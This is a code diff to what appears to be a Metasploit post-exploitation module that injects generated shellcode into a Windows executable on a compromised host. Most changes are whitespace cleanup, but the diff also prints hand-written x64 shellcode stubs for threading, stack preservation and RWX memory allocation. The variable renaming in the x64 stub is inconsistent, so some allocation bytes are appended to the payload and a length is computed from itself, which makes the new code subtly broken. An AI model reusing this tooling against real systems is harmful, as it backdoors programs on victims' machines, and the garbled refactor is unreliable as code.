@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Post
   # Run Method for when run command is issued
   def run
     session.core.use('peinjector')
-    
+
     # syinfo is only on meterpreter sessions
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
 
@@ -84,31 +84,31 @@ class MetasploitModule < Msf::Post
 
   def inject_payload(pay, targetpe)
 
-      begin 
-        print_status("Generating payload")
-        raw = pay.generate
-        param = {}
+    begin
+      print_status("Generating payload")
+      raw = pay.generate
+      param = {}
 
-        if pay.arch.join == ARCH_X64
-          threaded_shellcode = add_thread_x64(raw)
-          param[:isx64] = true
-        else
-          threaded_shellcode = add_thread_x86(raw)
-          param[:isx64] = false
-        end
-
-        param[:shellcode] = threaded_shellcode
-        param[:targetpe] = targetpe
-        param[:size] = threaded_shellcode.length;
-  
-        print_status("Injecting #{pay.name} into the executable #{param[:targetpe]}")
-	      client.peinjector.inject_shellcode(param)
-        print_good("Successfully injected payload into the executable: #{param[:targetpe]}")
-
-      rescue ::Exception => e
-        print_error("Failed to Inject Payload to executable #{param[:targetpe]}!")
-        print_error(e.to_s)
+      if pay.arch.join == ARCH_X64
+        threaded_shellcode = add_thread_x64(raw)
+        param[:isx64] = true
+      else
+        threaded_shellcode = add_thread_x86(raw)
+        param[:isx64] = false
       end
+
+      param[:shellcode] = threaded_shellcode
+      param[:targetpe] = targetpe
+      param[:size] = threaded_shellcode.length;
+
+      print_status("Injecting #{pay.name} into the executable #{param[:targetpe]}")
+      client.peinjector.inject_shellcode(param)
+      print_good("Successfully injected payload into the executable: #{param[:targetpe]}")
+
+    rescue ::Exception => e
+      print_error("Failed to Inject Payload to executable #{param[:targetpe]}!")
+      print_error(e.to_s)
+    end
   end
 
 
@@ -153,7 +153,7 @@ class MetasploitModule < Msf::Post
               "\x58\x58\x90\x61"
 
     thread += "\xe9"
-    
+
     thread += [shellcode.length].pack("V")
     return stackpreserve + thread + shellcode
   end
@@ -162,21 +162,20 @@ class MetasploitModule < Msf::Post
 
     stackpreserve = "\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50" +
                     "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
-                          
 
     stackrestore = "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59" +
                    "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
 
-    
+
     stackpreserve = "\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50" +
                     "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
-                          
 
-    shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
 
-    shellcode2 += payload
+    shellcode = "\xE8\xB8\xFF\xFF\xFF"
 
-    shellcode1 = "\x90" +                              # <--THAT'S A NOP. \o/
+    shellcode += payload
+
+    thread = "\x90" +                              # <--THAT'S A NOP. \o/
                  "\xe8\xc0\x00\x00\x00" +              # jmp to allocate
                  # api_call
                  "\x41\x51" +                          # push r9
@@ -188,19 +187,19 @@ class MetasploitModule < Msf::Post
                  "\x65\x48\x8B\x52\x60" +              # mov rdx,qword ptr gs:[rdx+96]
                  "\x48\x8B\x52\x18" +                  # mov rdx,qword ptr [rdx+24]
                  "\x48\x8B\x52\x20" +                  # mov rdx,qword ptr[rdx+32]
-                 
+
                  # next_mod
                  "\x48\x8b\x72\x50" +                  # mov rsi,[rdx+80]
                  "\x48\x0f\xb7\x4a\x4a" +              # movzx rcx,word [rdx+74]
                  "\x4d\x31\xc9" +                      # xor r9,r9
-                 
+
                  # loop_modname
                  "\x48\x31\xc0" +                      # xor rax,rax
                  "\xac" +                              # lods
                  "\x3c\x61" +                          # cmp al, 61h (a)
                  "\x7c\x02" +                          # jl 02
                  "\x2c\x20" +                          # sub al, 0x20
-                 
+
                  # not_lowercase
                  "\x41\xc1\xc9\x0d" +                  # ror r9d, 13
                  "\x41\x01\xc1" +                      # add r9d, eax
@@ -269,13 +268,13 @@ class MetasploitModule < Msf::Post
                   "\x5A" +                             # pop rdx ; Restore our position in the module list
                   "\x48\x8B\x12" +                     # mov rdx, [rdx] ; Get the next module
                   "\xe9\x57\xff\xff\xff"               # jmp next_mod ; Process this module
-                  
+
     # allocate
-    shellcode1 += "\x5d" +                             # pop rbp
+    shellcode += "\x5d" +                             # pop rbp
                   "\x49\xc7\xc6"                       # mov r14, 1abh size of payload...
 
-    shellcode1 += [shellcode2.length - 5].pack("V")
-    shellcode1 += "\x6a\x40" +                         # push 40h
+    shellcode += [shellcode.length - 5].pack("V")
+    shellcode += "\x6a\x40" +                         # push 40h
                   "\x41\x59" +                         # pop r9 now 40h
                   "\x68\x00\x10\x00\x00" +             # push 1000h
                   "\x41\x58" +                         # pop r8.. now 1000h
@@ -287,15 +286,15 @@ class MetasploitModule < Msf::Post
                   "\xff\xd5" +                         # call rbp
                   "\x48\x89\xc3" +                     # mov rbx, rax      ; Store allocated address in ebx
                   "\x48\x89\xc7"                       # mov rdi, rax      ; Prepare EDI with the new address
-                        
 
-    shellcode1 += "\x48\xc7\xc1"
-    shellcode1 += [shellcode2.length - 5].pack("V")
 
-    shellcode1 += "\xeb\x43"
+    thread += "\x48\xc7\xc1"
+    thread += [shellcode.length - 5].pack("V")
+
+    thread += "\xeb\x43"
 
     # got_payload:
-    shellcode1 += "\x5e" +                             # pop rsi            ; Prepare ESI with the source
+    thread += "\x5e" +                             # pop rsi            ; Prepare ESI with the source
                   "\xf2\xa4" +                         # rep movsb          ; Copy the payload to RWX memo
                   "\xe8\x00\x00\x00\x00" +             # call set_handler   ; Configure error handling
 
@@ -315,10 +314,10 @@ class MetasploitModule < Msf::Post
                   "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59" +
                   "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
 
-    shellcode1 += "\xe9"
-    shellcode1 += [shellcode2.length].pack("V")
+    thread += "\xe9"
+    thread += [shellcode.length].pack("V")
 
-    return stackpreserve + shellcode1 + shellcode2
+    return stackpreserve + thread + shellcode
   end
 
 
